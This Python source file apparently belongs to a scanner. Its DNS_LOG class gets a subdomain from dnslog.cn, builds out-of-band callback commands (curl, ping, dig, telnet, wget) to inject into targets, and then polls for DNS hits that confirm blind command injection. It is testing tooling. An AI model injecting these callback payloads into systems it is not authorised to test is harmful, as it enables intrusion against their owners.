import json
import logging
import time
from urllib.parse import urlparse

import requests

from lib.connection.HttpEntity import Request


class DNS_LOG:
    def __init__(self):
        self.takeout = [
            "curl %s",
            "ping %s",
            "dig %s",
            "telnet %s",
            "wget http://%s"
        ]
        self.get_record_url = 'http://www.dnslog.cn/getrecords.php'  # check record for domain name
        self.get_domain_url = 'http://www.dnslog.cn/getdomain.php'  # get domain name
        logging.info('[+] It takes a while to get DNS logged')
        try:
            r = Request('GET', self.get_domain_url).send()
            self.domain = r.body
            self.cookie = {'Cookie': "PHPSESSID=" + r.res.cookies.get('PHPSESSID')}
        except requests.exceptions.Timeout as e:
            if urlparse(e.request.url).hostname == 'www.dnslog.cn':
                logging.error('[-] DNSlog Platform Connection Failure')

    def check_log(self):
        time.sleep(20)  # wait 20 seconds to log dns
        res = Request('GET', self.get_record_url, headers=self.cookie).send().body
        record = json.loads(res)
        return record

    @property
    def takeout_cmd(self):
        return list(x % self.domain for x in self.takeout)